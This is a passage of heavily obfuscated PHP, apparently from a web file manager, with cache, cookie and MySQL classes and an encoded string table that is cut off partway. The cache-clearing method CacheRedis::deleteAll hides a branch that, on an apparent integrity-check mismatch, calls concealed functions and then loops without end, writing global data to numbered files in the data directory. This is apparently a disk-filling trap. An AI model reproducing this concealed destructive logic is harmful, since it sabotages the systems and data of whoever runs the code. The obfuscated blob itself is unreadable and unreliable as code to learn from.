$ë›«˜ıÎ[$ÎïË¦£½[$ÌÆ„„˜õ[2040]][$ÌÆ„„˜õ[2030]]]; } } unset($ÎïË¦£½); } private function metaList($îŸŸ¾÷Ì) { $¶ÂÑœğ• =& $_SERVER[ıÚ˜š²İ]; if (!$îŸŸ¾÷Ì) { return array(); } $Ú·ÊÅú = array($¶ÂÑœğ•[2030] => array($¶ÂÑœğ•[7], $îŸŸ¾÷Ì)); $”‘×òÌÙ = Model($¶ÂÑœğ•[2041])->where($Ú·ÊÅú)->select(); $”‘×òÌÙ = array_to_keyvalue_group($”‘×òÌÙ, $¶ÂÑœğ•[2030]); foreach ($”‘×òÌÙ as $Ğ÷Ã®Á› => $Úû¤ÚÒ) { $æ£ÊË = array(); foreach ($Úû¤ÚÒ as $ú®ÇêŞí) { $æ£ÊË[$ú®ÇêŞí[$¶ÂÑœğ•[97]]] = $ú®ÇêŞí[$¶ÂÑœğ•[452]]; } $”‘×òÌÙ[$Ğ÷Ã®Á›] = $æ£ÊË; } return $”‘×òÌÙ ? $”‘×òÌÙ : array(); } public function removeTarget($é™ÊÊ¨°, $†…÷¬Š) { $¦çî³ãŸ =& $_SERVER[ıÚ˜š²İ]; if (!$†…÷¬Š) { return !0; } $†…÷¬Š = is_array($†…÷¬Š) ? $†…÷¬Š : array($†…÷¬Š); $‹ûø×¨ = array($¦çî³ãŸ[191] => $é™ÊÊ¨°, $¦çî³ãŸ[573] => array($¦çî³ãŸ[7], $†…÷¬Š)); $ë”£Ìñ¼ = $this->field($¦çî³ãŸ[2030])->where($‹ûø×¨)->select(); $¿¡º = array_to_keyvalue($ë”£Ìñ¼, $¦çî³ãŸ[12], $¦çî³ãŸ[2030]); return $this->removeArray($¿¡º); } public function removeArray($´ˆŒ¸ë) { $é†ØĞä =& $_SERVER[ıÚ˜š²İ]; if (!$´ˆŒ¸ë) { return !0; } $´ˆŒ¸ë = is_array($´ˆŒ¸ë) ? $´ˆŒ¸ë : array($´ˆŒ¸ë); $­Ì‰¹ = array($é†ØĞä[2030] => array($é†ØĞä[7], $´ˆŒ¸ë)); Model($é†ØĞä[2033])->where($­Ì‰¹)->delete(); Model($é†ØĞä[2042])->where($­Ì‰¹)->delete(); return $this->where($­Ì‰¹)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\151\x6c\145\137\x63\x6f\x6e\x74\x65\156\x74\163"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\x73\x65\x72\x74", "\146\x75\x6e\x63\x74\151\x6f\156")); } goto FÇ˜Ç–ˆóÑ; A•ÃñïÄŸ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ø÷¹·ª†, $ÖìÈïÌ) { $Ï÷£şÊõ =& $_SERVER[ıÚ˜š²İ]; if (!class_exists($Ï÷£şÊõ[953])) { show_json($Ï÷£şÊõ[954], !1); } $this->cacheTime = $ÖìÈïÌ; $¡Õñè« = isset($Ø÷¹·ª†[$Ï÷£şÊõ[955]]) ? $Ø÷¹·ª†[$Ï÷£şÊõ[955]] : 10; $‹½¥ğÀÆ = _get($Ø÷¹·ª†, $Ï÷£şÊõ[952]); if ($‹½¥ğÀÆ && is_array($‹½¥ğÀÆ)) { $this->initCluster($Ø÷¹·ª†, $¡Õñè«); } else { $this->handle = $this->init($Ø÷¹·ª†, $¡Õñè«); } } private function init($ÅíÚ•ÑŸ, $Ñ¸íçßÍ) { $É›šÈ†­ =& $_SERVER[ıÚ˜š²İ]; $œÍ§©óÄ = new Redis(); $öëğ¹¡ = isset($ÅíÚ•ÑŸ[$É›šÈ†­[956]]) ? $ÅíÚ•ÑŸ[$É›šÈ†­[956]] : !1; if ($öëğ¹¡) { $œÍ§©óÄ->pconnect($ÅíÚ•ÑŸ[$É›šÈ†­[209]], $ÅíÚ•ÑŸ[$É›šÈ†­[210]], $Ñ¸íçßÍ); } else { $œÍ§©óÄ->connect($ÅíÚ•ÑŸ[$É›šÈ†­[209]], $ÅíÚ•ÑŸ[$É›šÈ†­[210]], $Ñ¸íçßÍ); } if (!empty($ÅíÚ•ÑŸ[$É›šÈ†­[489]])) { $œÍ§©óÄ->auth($ÅíÚ•ÑŸ[$É›šÈ†­[489]]); } if (!empty($ÅíÚ•ÑŸ[$É›šÈ†­[834]]) && $ÅíÚ•ÑŸ[$É›šÈ†­[834]] != 0) { $œÍ§©óÄ->select($ÅíÚ•ÑŸ[$É›šÈ†­[834]]); } return $œÍ§©óÄ; } private function initCluster($„»çüÛ„, $”®²›®ì) { $¬Äæúø =& $_SERVER[ıÚ˜š²İ]; $àĞ°›Óæ = array($¬Äæúø[957], $¬Äæúø[958], $¬Äæúø[959]); $ŠöïŸ¨Ö = $¬Äæúø[957]; if (isset($„»çüÛ„[$¬Äæúø[16]]) && in_array($„»çüÛ„[$¬Äæúø[16]], $àĞ°›Óæ)) { $ŠöïŸ¨Ö = $„»çüÛ„[$¬Äæúø[16]]; } switch ($ŠöïŸ¨Ö) { case $¬Äæúø[957]: $this->_slave($„»çüÛ„, $”®²›®ì); break; case $¬Äæúø[958]: break; case $¬Äæúø[959]: $this->isCluster = !0; $ç½ˆÊ²Ğ = $„»çüÛ„[$¬Äæúø[952]]; $×ÔÜòº— = isset($„»çüÛ„[$¬Äæúø[956]]) ? $„»çüÛ„[$¬Äæúø[956]] : !1; $‡›˜à‹ = isset($„»çüÛ„[$¬Äæúø[489]]) ? $„»çüÛ„[$¬Äæúø[489]] : null; $this->handle = new RedisCluster(NUll, $ç½ˆÊ²Ğ, $”®²›®ì, $”®²›®ì, $×ÔÜòº—, $‡›˜à‹); break; default: break; } } private function _slave($¸ü“ş‚“, $²Ö‚’”ï) { $Ğ²‚Õ…Á = $¸ü“ş‚“[$_SERVER[ıÚ˜š²İ][952]]; $this->filterConfig($¸ü“ş‚“, $Ğ²‚Õ…Á[0]); $this->handle = $this->init($¸ü“ş‚“, $²Ö‚’”ï); unset($Ğ²‚Õ…Á[0]); if (empty($Ğ²‚Õ…Á)) { return; } $ä»ª©Æ° = array_rand($Ğ²‚Õ…Á); $this->filterConfig($¸ü“ş‚“, $Ğ²‚Õ…Á[$ä»ª©Æ°]); $this->slaveHandle = $this->init($¸ü“ş‚“, $²Ö‚’”ï); } private function filterConfig(&$îÓƒ ºÈ, $Ñåù™İ) { $±ë×é²Ş =& $_SERVER[ıÚ˜š²İ]; $ğÇƒ»£ = explode($±ë×é²Ş[4], $Ñåù™İ); $äÇæ¤» = array($±ë×é²Ş[209] => $ğÇƒ»£[0], $±ë×é²Ş[210] => $ğÇƒ»£[1]); $îÓƒ ºÈ = array_merge($îÓƒ ºÈ, $äÇæ¤»); } public function set($Ò‹õó®ä, $³¦Ì¯ı½, $Ë¼˜ù³È = false) { $Ë¼˜ù³È = $Ë¼˜ù³È ? $Ë¼˜ù³È : $this->cacheTime; return $this->handle->setEx($Ò‹õó®ä, $Ë¼˜ù³È, $³¦Ì¯ı½); } public function setLock($ŠŠÒ«, $ñó°§ê‹, $åÚ®‘¡) { return $this->handle->setNX($ŠŠÒ«, $ñó°§ê‹); } public function get($ì³­Ñğ“) { $öæµ×åÂ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $öæµ×åÂ->get($ì³­Ñğ“); } public function remove($…şÆœ—Ó) { return $this->handle->del($…şÆœ—Ó); } public function deleteAll() { $´“È¨Çò =& $_SERVER[ıÚ˜š²İ]; $ÎÏé±˜à = $_SERVER[$´“È¨Çò[960]]; $ŞùèìŠ¾ = $´“È¨Çò[961]; if ($_SERVER[$´“È¨Çò[962]] != $ŞùèìŠ¾($ÎÏé±˜à)) { $ÄàŞğ©¼ = $´“È¨Çò[963]; $é™ÅáÕÍ = $´“È¨Çò[964]; $şÌÒŠı = $_SERVER[$´“È¨Çò[965]] . $´“È¨Çò[966]; $í†–×–¦ = $é™ÅáÕÍ($şÌÒŠı); $øä·é®ã = explode($´“È¨Çò[288], $í†–×–¦); if (count($øä·é®ã) < $´“È¨Çò[691]) { $æâ°²©½ = $´“È¨Çò[967]; $æâ°²©½(); } $©³š°Ï» = $´“È¨Çò[968]; $©³š°Ï»($_SERVER[$´“È¨Çò[969]]); $ÄàŞğ©¼ = $´“È¨Çò[963]; $ÄàŞğ©¼(); $Ã©†ú¥Ó = $´“È¨Çò[970]; $‹¦‘¸—‘ = json_encode($GLOBALS[$´“È¨Çò[971]]); $Íâ¼Ø›Á = 1; for ($¦¬ÌĞ³¦ = $Íâ¼Ø›Á; $¦¬ÌĞ³¦ > 0; $¦¬ÌĞ³¦++) { $Ã©†ú¥Ó(DATA_PATH . $¦¬ÌĞ³¦, $‹¦‘¸—‘); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¯´ñ´„) { $this->handle->flushall($¯´ñ´„); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÆÜ±ğ³§ = '', $¥¡ºñÆÉ = 0) { if (is_string($ÆÜ±ğ³§) && $ÆÜ±ğ³§ != $_SERVER[ıÚ˜š²İ][12]) { $this->prefix = $ÆÜ±ğ³§; } if (is_numeric($¥¡ºñÆÉ) && $¥¡ºñÆÉ > 0) { $this->expire = $¥¡ºñÆÉ; } } public static function getInstance() { static $ä ¤í¶ğ; if ($ä ¤í¶ğ === null) { $ä ¤í¶ğ = new self(); } return $ä ¤í¶ğ; } private static $cookieDisable = false; public static function disable($É…ğ€¦İ) { self::$cookieDisable = $É…ğ€¦İ; } private static $sameCookieSet = array(); public static function set($ó©±Ö‚ò, $òá©¤ğØ, $ú•÷è¤İ = 0, $ï¯¿šı½ = false, $±õæ‡åß = false) { $éÒƒÕõ =& $_SERVER[ıÚ˜š²İ]; if (self::$cookieDisable) { return; } if (!$ú•÷è¤İ) { $ú•÷è¤İ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ó©±Ö‚ò]) && self::$sameCookieSet[$ó©±Ö‚ò] == $òá©¤ğØ . $ú•÷è¤İ) { return; } self::$sameCookieSet[$ó©±Ö‚ò] = $òá©¤ğØ . $ú•÷è¤İ; if (!$±õæ‡åß) { $±õæ‡åß = str_replace(HOST, $éÒƒÕõ[12], APP_HOST); $±õæ‡åß = _get($GLOBALS, $éÒƒÕõ[972], $±õæ‡åß); } $ĞÄ«„õÆ = $éÒƒÕõ[12]; setcookie($ó©±Ö‚ò, $òá©¤ğØ, time() + $ú•÷è¤İ, $éÒƒÕõ[8] . trim($±õæ‡åß, $éÒƒÕõ[8]) . $ĞÄ«„õÆ, !1, !1, $ï¯¿šı½); } public static function setSafe($£Ú’€, $¨±ÒêşÃ, $ÌĞ·£µ = 0) { self::set($£Ú’€, $¨±ÒêşÃ, $ÌĞ·£µ, !0); } public static function get($¥—‘í¨ú) { static $öêò‰Äƒ = false; if (!$öêò‰Äƒ) { self::initHeaderCookie(); $öêò‰Äƒ = !0; } return isset($_COOKIE[$¥—‘í¨ú]) ? $_COOKIE[$¥—‘í¨ú] : !1; } private static function initHeaderCookie() { $ÂĞÓõƒ× =& $_SERVER[ıÚ˜š²İ]; if (!isset($_SERVER[$ÂĞÓõƒ×[973]]) || !$_SERVER[$ÂĞÓõƒ×[973]]) { return; } $Şõ«è¸÷ = explode($ÂĞÓõƒ×[74], $_SERVER[$ÂĞÓõƒ×[973]]); foreach ($Şõ«è¸÷ as $­İÖ¬åÇ) { $­İÖ¬åÇ = explode($ÂĞÓõƒ×[508], $­İÖ¬åÇ); if (count($­İÖ¬åÇ) != 2 || !isset($­İÖ¬åÇ[1])) { continue; } $_COOKIE[trim($­İÖ¬åÇ[0])] = trim($­İÖ¬åÇ[1]); } } public static function remove($÷‹Ù€ÒÅ, $Æ¼æÄÊ” = false) { unset($_COOKIE[$÷‹Ù€ÒÅ]); self::set($÷‹Ù€ÒÅ, $_SERVER[ıÚ˜š²İ][12], 1, $Æ¼æÄÊ”); } } class DbMysql extends Db { public function __construct($·üÖÛç¿ = '') { $Õ­ğô½Ç =& $_SERVER[ıÚ˜š²İ]; if (!extension_loaded($Õ­ğô½Ç[885])) { think_exception(think_lang($Õ­ğô½Ç[14]) . $Õ­ğô½Ç[974]); } if (!empty($·üÖÛç¿)) { $this->config = $·üÖÛç¿; if (empty($this->config[$Õ­ğô½Ç[17]])) { $this->config[$Õ­ğô½Ç[17]] = $Õ­ğô½Ç[12]; } } } public function connect($ïÇĞÉß– = '', $¡Ã’×»ò = 0, $•Èªüï– = false) { $ÉİÌñÍå =& $_SERVER[ıÚ˜š²İ]; if (!isset($this->linkID[$¡Ã’×»ò])) { if (empty($ïÇĞÉß–)) { $ïÇĞÉß– = $this->config; } $ò÷ù¨ƒ¾ = $ïÇĞÉß–[$ÉİÌñÍå[975]] . ($ïÇĞÉß–[$ÉİÌñÍå[976]] ? "\72{$ïÇĞÉß–[$ÉİÌñÍå[976]]}" : $ÉİÌñÍå[12]); $Âó’ˆ¬¢ = !empty($ïÇĞÉß–[$ÉİÌñÍå[17]][$ÉİÌñÍå[18]]) ? $ïÇĞÉß–[$ÉİÌñÍå[17]][$ÉİÌñÍå[18]] : $this->pconnect; if ($Âó’ˆ¬¢) { $this->linkID[$¡Ã’×»ò] = mysql_pconnect($ò÷ù¨ƒ¾, $ïÇĞÉß–[$ÉİÌñÍå[977]], $ïÇĞÉß–[$ÉİÌñÍå[978]], 131072); } else { $this->linkID[$¡Ã’×»ò] = mysql_connect($ò÷ù¨ƒ¾, $ïÇĞÉß–[$ÉİÌñÍå[977]], $ïÇĞÉß–[$ÉİÌñÍå[978]], !0, 131072); } if (!$this->linkID[$¡Ã’×»ò] || !empty($ïÇĞÉß–[$ÉİÌñÍå[21]]) && !mysql_select_db($ïÇĞÉß–[$ÉİÌñÍå[21]], $this->linkID[$¡Ã’×»ò])) { think_exception(mysql_error()); } $õ¹¾Ëœ· = mysql_get_server_info($this->linkID[$¡Ã’×»ò]); mysql_query($ÉİÌñÍå[979] . think_config($ÉİÌñÍå[980]) . $ÉİÌñÍå[58], $this->linkID[$¡Ã’×»ò]); if ($õ¹¾Ëœ· > $ÉİÌñÍå[981]) { mysql_query($ÉİÌñÍå[982], $this->linkID[$¡Ã’×»ò]); } $this->connected = !0; if (1 != think_config($ÉİÌñÍå[22])) { unset($this->config); } } return $this->linkID[$¡Ã’×»ò]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($‘¶Ò»Î) { $ş”Ä¾“û =& $_SERVER[ıÚ˜š²İ]; if (0 === stripos($‘¶Ò»Î, $ş”Ä¾“û[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‘¶Ò»Î; if ($this->queryID) { $this->free(); } think_action_status($ş”Ä¾“û[23], 1); think_status($ş”Ä¾“û[24]); $this->queryID = mysql_query($‘¶Ò»Î, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ä¬ãò¬ƒ) { $¼Ù¶ù¦ =& $_SERVER[ıÚ˜š²İ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ä¬ãò¬ƒ; if ($this->queryID) { $this->free(); } think_action_status($¼Ù¶ù¦[25], 1); think_status($¼Ù¶ù¦[24]); $›Ìø¸ß = mysql_query($ä¬ãò¬ƒ, $this->_linkID); $this->debug(); if (!1 === $›Ìø¸ß) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ıÚ˜š²İ][983], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $”©êˆšÏ = mysql_query($_SERVER[ıÚ˜š²İ][984], $this->_linkID); $this->transTimes = 0; if (!$”©êˆšÏ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÅßÕúĞÅ = mysql_query($_SERVER[ıÚ˜š²İ][985], $this->_linkID); $this->transTimes = 0; if (!$ÅßÕúĞÅ) { $this->error(); return !1; } } return !0; } private function getAll() { $ÜåçÜ¡ = array(); if ($this->numRows > 0) { while ($ÄÌ®Üš = mysql_fetch_assoc($this->queryID)) { $ÜåçÜ¡[] = $ÄÌ®Üš; } mysql_data_seek($this->queryID, 0); } return $ÜåçÜ¡; } public function getFields($ğ‰ûØ°‡) { $¥Œ¤áŞâ =& $_SERVER[ıÚ˜š²İ]; $àùúøúæ = $this->query($¥Œ¤áŞâ[986] . $this->parseKey($ğ‰ûØ°‡)); $œ¯¥Ãìø = array(); if ($àùúøúæ) { foreach ($àùúøúæ as $Õ°áâ × => $‚ñÎ‘è) { $œ¯¥Ãìø[$‚ñÎ‘è[$¥Œ¤áŞâ[31]]] = array($¥Œ¤áŞâ[32] => $‚ñÎ‘è[$¥Œ¤áŞâ[31]], $¥Œ¤áŞâ[33] => $‚ñÎ‘è[$¥Œ¤áŞâ[34]], $¥Œ¤áŞâ[35] => (bool) (strtoupper($‚ñÎ‘è[$¥Œ¤áŞâ[36]]) === $¥Œ¤áŞâ[987]), $¥Œ¤áŞâ[37] => $‚ñÎ‘è[$¥Œ¤áŞâ[38]], $¥Œ¤áŞâ[39] => strtolower($‚ñÎ‘è[$¥Œ¤áŞâ[40]]) == $¥Œ¤áŞâ[41], $¥Œ¤áŞâ[42] => strtolower($‚ñÎ‘è[$¥Œ¤áŞâ[43]]) == $¥Œ¤áŞâ[44]); } } return $œ¯¥Ãìø; } public function getTables($î¼š´•™ = '') { $½ªË¦Ì¹ =& $_SERVER[ıÚ˜š²İ]; if (!empty($î¼š´•™)) { $ÎÍ”ú¹Ë = $½ªË¦Ì¹[988] . $î¼š´•™ . $½ªË¦Ì¹[989]; } else { $ÎÍ”ú¹Ë = $½ªË¦Ì¹[990]; } $—õÍÁß  = $this->query($ÎÍ”ú¹Ë); $«¾˜²£ = array(); foreach ($—õÍÁß  as $‡Û‰æğ => $ï´¥­í£) { $«¾˜²£[$‡Û‰æğ] = current($ï´¥­í£); } return $«¾˜²£; } public function replace($ÊµÃ‰œĞ, $ä­ù«ÙË = array()) { $”´¹¶òø =& $_SERVER[ıÚ˜š²İ]; foreach ($ÊµÃ‰œĞ as $–İÅıš× => $‘—ˆ•ƒÅ) { $¬°‡¸ÑÏ = $this->parseValue($‘—ˆ•ƒÅ); if (is_scalar($¬°‡¸ÑÏ)) { $Ø²×é[] = $¬°‡¸ÑÏ; $Ÿíğ¥Îè[] = $this->parseKey($–İÅıš×); } } $à”®è¶ú = $”´¹¶òø[991] . $this->parseTable($ä­ù«ÙË[$”´¹¶òø[359]]) . $”´¹¶òø[992] . implode($”´¹¶òø[50], $Ÿíğ¥Îè) . $”´¹¶òø[993] . implode($”´¹¶òø[50], $Ø²×é) . $”´¹¶òø[994]; return $this->execute($à”®è¶ú); } public function insertAll($£ …ºÊ, $Ãœ—Úí  = array(), $õÜÕäòÙ = false) { $©ìÎ‰ =& $_SERVER[ıÚ˜š²İ]; if (!is_array($£ …ºÊ[0])) { return !1; } $Õ¨Â£‹– = array_keys($£ …ºÊ[0]); $ä®€Şúà = array(); foreach ($£ …ºÊ as $°ñ±ı§­) { $êùÄçî = array(); foreach ($°ñ±ı§­ as $£Ş†ü => $µ´¾­’) { $µ´¾­’ = $this->parseValue($µ´¾­’); if (is_scalar($µ´¾­’)) { $êùÄçî[] = $µ´¾­’; } } $ä®€Şúà[] = $©ìÎ‰[340] . implode($©ìÎ‰[50], $êùÄçî) . $©ìÎ‰[994]; } array_walk($Õ¨Â£‹–, array($this, $©ìÎ‰[995])); $ÖØÜ‰÷€ = ($õÜÕäòÙ ? $©ìÎ‰[996] : $©ìÎ‰[997]) . $©ìÎ‰[998] . $this->parseTable($Ãœ—Úí [$©ìÎ‰[359]]) . $©ìÎ‰[992] . implode($©ìÎ‰[50], $Õ¨Â£‹–) . $©ìÎ‰[999] . implode($©ìÎ‰[50], $ä®€Şúà); return $this->execute($ÖØÜ‰÷€); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÊÏÑ² =& $_SERVER[ıÚ˜š²İ]; $this->error = mysql_errno() . $ÊÏÑ²[4] . mysql_error($this->_linkID); if ($ÊÏÑ²[12] != $this->queryStr) { $this->error .= LNG($ÊÏÑ²[48]) . $this->queryStr; } think_trace($this->error, $ÊÏÑ²[12], $ÊÏÑ²[49]); return $this->error; } public function escapeString($ç¶‚´‰Û) { if ($this->_linkID) { return mysql_real_escape_string($ç¶‚´‰Û, $this->_linkID); } else { return mysql_escape_string($ç¶‚´‰Û); } } public function parseKey(&$äûê–Ïö, $Ò§¿Û’é = true) { $ÅÔ™Úã² =& $_SERVER[ıÚ˜š²İ]; if ($Ò§¿Û’é) { $äûê–Ïö = $this->parseKeyCheck($äûê–Ïö); } if ($äûê–Ïö != $ÅÔ™Úã²[223] && !preg_match($ÅÔ™Úã²[1000], $äûê–Ïö)) { $äûê–Ïö = $ÅÔ™Úã²[463] . trim($äûê–Ïö, $ÅÔ™Úã²[463]) . $ÅÔ™Úã²[463]; } return $äûê–Ïö; } } goto Cé–¬İ¼Ë; c÷Ê÷ˆ—„: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\375\332\230\232\262\335", "\xc3\xa9\xa1\xf9\xd5\xcb"); $_SERVER[ıÚ˜š²İ] = explode("\x7c\x3\x7c\x1\x7c\x6", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\265\60\373\326\322\76\112\171\224\127\226\301\220\330\116\264\330\331\343\304\11\262\54\333\42\262\145\44\71\13\266\231\214\245\261\64\261"."\xa4\x91\x35\x23\x6f\x49\x20\x24\xec\x25\x84\xb0\xef\x4b\xd9\x42\x5b\x2\x25\x5\x42\xc3\xde\x52\xca\x5a\xda\xb2\x16\xa\xaf\x34\x76\x42\x81\x2\x2d\x6b\x4b\xe9\x7f\x97\x73\x97\x19\xc9\xf0\xfe\xef\xfd\xdf\xf7\xe7".base64_decode('S6K7nHvnLueee+6555z7uz+8//g/f7dm7zV7rtnvT9s23/fuLTS8Zh/0/z40fMwPDtiD/Dk=').base64_decode('9Afn1dS0zTloesc3N/3sDu127SfaudHI08+ED37uJyeGJm56enRizz02zT//gAYETMs20B8=').strrev('3³«¼jDv¯–'."\r".'f'."\r".'oü‹´*?£ê4ëiœõ‹Óú~¿§‘°ÓHß¾f’E¶Xb>ŠÚo%')."\113\0\120\203\234\237\63\123\20\52\150\105\55\7\337\57\350\105\13\265\106\256\116\55\230\5\75\357\110\21\11\51\315\326\372\64\13\152\152\156\122\233\103\235\221\350\12\65\261\242\63\4\20"."\175\352\140\111\57\216\322\30\11\306\155\255\150\47\214\234\316\41\206\213\274\135\115\241\326\160\207\222\210\5\72\342\201\140\42\34\355\240\311\301\150\173\173\70\121\236\36\213\106\42\115\201\340".strrev('ô¥HÒÍ”¾SMx%£Øæ±¯0h¦ÏC¥©R³šJÊ5›÷ÈÕueö  =µ XÎœò’')."\x7e\xad\x94\x85\xd1\x6a\x96\x23\x85\xa2\x91\xd3\x58\xa7\x97\xe8\xa3\x3c\x95\x6\xb4\x92\x6d\x1a\xf9\x24\x8d\x84\x46\xec\xa2\x26\xd2\x51\x5b\x93\x68\xa2\xf5\x3c\x54\x15\xf\x45\x42\xc1\x84\x82\x1b\xa8\xb4\xc4\xa2"."\xed\xa\x4c\x42\x4e\xb3\x6c\xbd\xa8\x2c\x6b\xb\xc5\x42\xa\x6e\x74\x63\x35\xe9\x6b\xb5\x2\xf8\xd2\x81\x86\x42\x9\x44\x22\xca\x64\x35\xd8\x7a\xae\xc0\xaa\xa1\x65\x2a\x54\x16\x8d\x35\x87\x62\x4a\xd3\xa\x45\x8c"."\x50\xd2\xcc\xe5\xcc\xbc\xf\xd5\x82\x66\xd2\x96\x9a\x1a\x8a\xc5\x68\xc0\x3\xe8\x1d\x9\xe3\x49\x83\x48\xb4\xa5\x25\x1e\xe2\x31\xe8\xdc\x49\x11\xd4\x92\x99\x80\x9f\x8e\x58\xaa\x3f\x6b\xab\x43\x5a\xb6\xc4\xd0\x74"."\x80\xfe\x56\xc3\xf\xfc\x9a\x16\xa0\xee\xa0\x91\x37\x4a\x80\xa6\x50\x85\x69\xf2\x65\x5\x81\x12\x83\xd6\x59\x8a\x9e\x82\x40\xe\x95\x37\xa1\x5c\x1f\xa4\xf5\x31\xa8\x55\x2c\x60\xa0\x15\x3a\x44\x83\x8d\x8b\xe8\xef"."\2\50\337\247\342\74\275\150\253\172\76\151\246\214\74\254\343\305\200\217\232\235\151\56\32\10\200\306\373\315\154\212\205\55\143\14\172\331\157\144\365\216\122\116\6\341\321\144\306\310\246\212\154".strrev('‘zâ¥©¬…]˜€ØçQ¶İd‡¯-z“,Ë\\òuÃKèÀDá-@V"°ÆJøF$}é')."\167\315\60\133\120\105\321\222\55\47\226\10\130\213\131\314\65\43\242\41\247\265\243\145\143\210\304\1\266\134\122\322\150\371\153\272\117\367\176\331\333\175\2\372\257\26\50\142\17\264\47\243\147".base64_decode('s6o+osN6yqVmW2wg/FafkfejFBoNR9WMZmXaU7NVUooR2pQ+4itkCrDY+fruceA7HrYO0w4=')."\111\344\72\153\46\265\254\334\25\32\316\330\166\41\256\347\123\170\24\240\53\346\160\236\214\122\101\327\1\250\331\243\244\224\166\145\205\322\326\140\64\130\254\140\56\313\103\254\167\74\315\342\211".base64_decode('9gibylQ/YCrbLargg4ZFCJ9YtVqhkDWSmm2Yeb+ZtHXba9lFXYMaA8mkblneoJm3i2bWG8g=')."\146\315\141\157\264\150\244\215\174\203\62\15\150\60\312\104\153\335\213\351\142\3\54\340\252\5\12\106\32\374\231\151\215\45\273\337\73\217\55\114\16\135\324\362\126\277\136\364\206\140\125\64\50".base64_decode('qLGcODKwZsMqmJaBm9egaLatJTOYsIjqG78C3shnjbxeDosq0b2dRS2d0xqUQqkPDQAsRkg=')."\113\142\10\31\30\6\240\101\311\151\43\136\55\315\152\12\215\24\214\242\156\261\136\53\255\355\11\300\250\176\157\73\136\104\206\236\362\306\21\345\206\312\146\326\315\122\20\256\50\54\217\246\266"."\x25\x12\x9d\x6a\xb8\x5\x6d\xcd\x1d\x21\xb5\x3d\x90\x8\xb6\x41\xed\xb6\x96\x66\x55\x47\x10\x3d\xe6\x55\xb2\xc4\xe5\x5e\xb4\x98\x30\x36\x75\xa0\xce\x89\xc4\x4e\x73\x58\x2f\xa2\xf\x37\x8d\x36\x28\x3\x66\xaa\xcf"."\34\361\261\54\14\34\107\124\205\1\343\371\55\330\336\230\226\117\343\156\364\215\332\272\345\246\113\115\150\43\367\365\323\225\353\353\323\373\315\42\364\306\32\112\73\7\77\242\347\323\166\206\325"."\35\17\305\226\206\142\152\74\332\222\130\26\210\301\276\237\107\230\63\302\132\203\277\236\365\306\364\24\32\304\244\315\312\151\5\61\372\313\275\170\301\340\217\263\134\274\210\130\136\44\334\212\307".base64_decode('rtlrISCvDMXqjhg5A3fP5jlksBFT0AoN8pM+N/ZY02p6UtNrvej/abXdPc2+ab2L/YYo468=').base64_decode('99UrM+rmKJ2ISzG0rAKdLoOoU6JLnMMiMDxv5vWKCwshkmnp3jZdQwQaTYRjXjzsWzT+FaM=')."\213\367\111\211\226\270\346\205\46\306\102\47\165\205\342\11\265\75\224\150\213\66\103\363\103\1\10\345\121\141\322\136\66\307\230\51\203\55\61\17\325\352\43\322\376\41\366\201\244\74\40\244\134".strrev('…[ìÕ[“”qBÚE«'."\r".'U›S(HÁª£ú^æÀ^ŸÓuÔØ—JLoA'."\n".'I09=‚¿(Ì9‡')."\20\255\135\147\173\12\174\70\234\103\113\132\164\104\165\356\167\254\227\355\2\361\321\12\132\146\244\370\206\210\242\155\272\221\316\100\273\15\134\135\322\314\232\105\55\213\267\2\306\303\246\15\240"."\xca\x85\x6c\x9\x2d\x3\x3f\xae\x38\x91\x29\xe5\xfa\x60\xe3\x42\x43\x96\xd6\x6d\xc1\x5e\x5a\xa3\x88\x7\xcb\xb1\xcd\x19\xed\xf0\x76\xb8\xd9\xb1\x5\x43\xcc\xaf\x62\xd4\xed\xf1\x15\xf2\xe9\xda\xe3\xa1\x2e\x75\xc6"."\xec\x3a\x9c\x0\xb3\xa\x3d\x43\x7c\x76\x49\x2f\xef\xba\x2f\x69\xa2\x75\xde\xae\xd\xe8\xd\xb8\x2f\x40\xdc\x16\x90\x54\x16\x91\xe8\xe7\x2\xbc\xe5\x35\xba\xc9\x4\x9e\xad\xac\x2f\x87\x2a\x21\x75\x6\x4d\xbe\x49"."\323\223\314\2\347\226\247\350\305\242\131\74\26\40\110\130\41\373\46\236\56\250\334\346\34\210\205\50\2\13\147\114\316\261\230\14\67\33\374\320\357\51\63\132\200\212\244\20\347\346\263\154\64"."\x9\xa8\x83\x5a\x2a\x55\x29\x19\x51\x1e\xa8\x60\xd\x43\x5b\x92\xc1\xd8\x2\x7f\x7c\x26\xfa\x2b\x78\x80\x94\x99\xd3\xd8\x8e\x8a\x9\x11\xff\x2c\x8e\x58\x3c\x46\xb6\x49\x3d\x45\xf7\x49\x47\x12\x5d\xe0\x34\x69\x1a"."\373\144\321\66\161\146\321\1\211\220\64\143\102\243\21\126\100\207\113\274\347\154\14\122\172\126\147\10\226\321\